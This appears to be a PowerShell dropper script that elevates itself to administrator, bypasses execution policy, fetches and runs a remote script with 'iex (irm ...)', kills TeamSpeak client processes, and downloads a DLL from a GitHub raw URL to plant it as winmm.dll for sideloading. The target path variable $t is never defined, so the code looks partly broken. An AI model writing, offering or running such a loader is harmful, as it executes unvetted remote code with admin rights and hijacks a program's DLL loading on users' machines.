param(
    [string]$u = 'https://raw.githubusercontent.com/suttirakkhiwsatapon-bit/dllv1/refs/heads/main/dllv1.0.dll',
    [string]$p = '',
    [string]$s = 'https://raw.githubusercontent.com/suttirakkhiwsatapon-bit/dllv1/refs/heads/main/dllv1.01.ps1'
)

$ProgressPreference = 'Continue'

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $ue = $u.Replace("'", "''"); $pe = $p.Replace("'", "''"); $se = $s.Replace("'", "''")
    Start-Process powershell -Verb RunAs -ArgumentList "-nop -ep bypass -c `"`$u='$ue'; `$p='$pe'; iex (irm '$se')`""
    exit
}

Get-Process ts3client_win64,ts3client_win32 -EA 0 | Stop-Process -Force -EA 0
$f = Join-Path $env:TEMP 'wmm.tmp'
Invoke-WebRequest $u -OutFile $f -UseBasicParsing
Copy-Item $f (Join-Path $t 'winmm.dll') -Force
Remove-Item $f -Force -EA 0
Write-Host 'OK'
